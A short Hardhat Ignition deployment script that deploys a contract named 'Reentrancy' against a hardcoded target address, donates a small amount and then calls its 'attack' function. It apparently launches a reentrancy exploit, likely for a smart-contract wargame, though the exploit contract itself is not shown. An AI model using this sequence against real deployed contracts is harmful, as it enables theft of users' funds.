import { buildModule } from "@nomicfoundation/hardhat-ignition/modules";

const REENTRANCY_ADDRESS = "0x38D336Cc4990D4ab228b331f08cCdF89C0d9bcC0";


export default buildModule("ReentrancyModule", (m) => {
  const reentrancy = m.contract("Reentrancy", [REENTRANCY_ADDRESS]);

  const donate =  m.call(reentrancy, "donate", [], { value: 1000000000000000n , id: "donate" });
  
  m.call(reentrancy, "attack", [], { value: 1000000000000000n , id: "attack" , after: [donate] });
 // m.call(reentrancy, "attack", [], { value: 1000000000000000n });

 return { reentrancy };
});

